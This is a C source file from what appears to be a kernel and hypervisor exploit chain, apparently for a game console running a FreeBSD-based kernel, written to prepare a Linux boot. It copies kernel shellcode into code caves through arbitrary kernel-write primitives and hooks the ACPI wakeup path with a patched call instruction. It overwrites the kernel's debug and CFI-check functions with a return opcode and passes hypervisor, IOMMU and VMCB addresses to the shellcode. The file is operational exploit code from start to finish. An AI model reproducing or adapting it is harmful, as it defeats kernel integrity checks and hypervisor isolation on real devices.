#include <stdio.h>
#include <stdint.h>
#include "prepare_resume.h"
#include "iommu.h"
#include "../shellcode_kernel/shellcode_kernel.h"
#include "offsets.h"
#include "utils.h"

int prepare_resume(void) {

  if (env_offset.KERNEL_CODE_CAVE == 0) {
    printf("Error: missing code cave offset\n");
    return -1;
  }

  if (env_offset.KERNEL_DATA_CAVE == 0) {
    printf("Error: missing data cave offset\n");
    return -1;
  }

  printf("\nWriting Shell Code for WakeUp path and patching "
         "AcpiSetFirmwareWakingVector in acpi_wakeup_machdep\n");

  uint64_t dest_text = ktext + env_offset.KERNEL_CODE_CAVE;
  uint64_t dest_data = ktext + env_offset.KERNEL_DATA_CAVE;

  kwrite_large(dest_text, shellcode_kernel_text, shellcode_kernel_text_len);
  prepare_sck_args(dest_data);

  if(update_sck_data_ptr(shellcode_kernel_text, dest_text, dest_data))
    return -1;

  hook_call_near(ktext + env_offset.HOOK_ACPI_WAKEUP_MACHDEP, dest_text);

  kwrite8(ktext + env_offset.KERNEL_DEBUG_PATCH, 0xC3);
  kwrite8(ktext + env_offset.KERNEL_CFI_CHECK, 0xC3);

  return 0;
}

int update_sck_data_ptr (void* sc, uint64_t dest_text, uint64_t dest_data) {
  // Find the address 0x11AA11AA11AA11AA used as marker
  int offset = -1;
  for (int i = 0; i < 0x40; i++) {
    if (*(uint64_t *)((uint64_t)sc + i) == 0x11AA11AA11AA11AA) {
      offset = i;
      break;
    }
  }
  if (offset == -1) {
    notify("Could not find offset of args_ptr address - Aborting\n");
    return -1;
  }
  kwrite64(dest_text + offset, dest_data);
  return 0;
}

void hook_call_near(uint64_t hook, uint64_t dst) {
  int64_t diff_call = dst - hook;
  uint8_t new_instr[5]; new_instr[0] = 0xE8;
  *((uint32_t *)&new_instr[1]) = (int32_t)(diff_call - 5);
  kernel_copyin(new_instr, hook, 5);
  DEBUG_PRINT("Instruction patched\n");
}

void prepare_sck_args(uint64_t dest_data) {
  shellcode_kernel_args args;
  args.fw_version = kernel_get_fw_version() & 0xFFFF0000;
  args.ktext = ktext;
  args.kdata = kdata;
  args.dmap_base = dmap;

  args.fun_printf = ktext + env_offset.FUN_PRINTF;
  args.fun_va_to_pa = ktext + env_offset.FUN_VA_TO_PA;
  args.fun_hv_iommu_set_buffers = ktext + env_offset.FUN_HV_IOMMU_SET_BUFFERS;
  args.fun_hv_iommu_wait_completion =
      ktext + env_offset.FUN_HV_IOMM_WAIT_COMPLETION;
  args.fun_smp_rendezvous = ktext + env_offset.FUN_SMP_RENDEZVOUS;
  args.fun_smp_no_rendevous_barrier =
      ktext + env_offset.FUN_SMP_NO_RENDEVOUS_BARRIER;
  args.g_vbios = ktext + env_offset.G_VBIOS;

  args.fun_transmitter_control = ktext + env_offset.FUN_TRANSMITTER_CONTROL;
  args.fun_mp3_initialize = ktext + env_offset.FUN_MP3_INITIALIZE;
  args.fun_mp3_invoke = ktext + env_offset.FUN_MP3_INVOKE;

  args.iommu_mmio_va = iommu->mmio_va;
  args.iommu_cb2_va = iommu->cb2_base;
  args.iommu_cb3_va = iommu->cb3_base;
  args.iommu_eb_va = iommu->eb_base;
  memcpy(&args.vmcb[0], &vmcb_pa[0], sizeof(args.vmcb[0]) * 16);

  args.kernel_uart_override = ktext + env_offset.KERNEL_UART_OVERRIDE;
  args.hv_handle_vmexit_pa = env_offset.HV_HANDLE_VMEXIT_PA;
  args.hv_code_cave_pa = env_offset.HV_CODE_CAVE_PA;
  args.hv_uart_override_pa = env_offset.HV_UART_OVERRIDE_PA;

  args.linux_info_va = linux_i.linux_info;

  kernel_copyin(&args, dest_data, sizeof(args));
}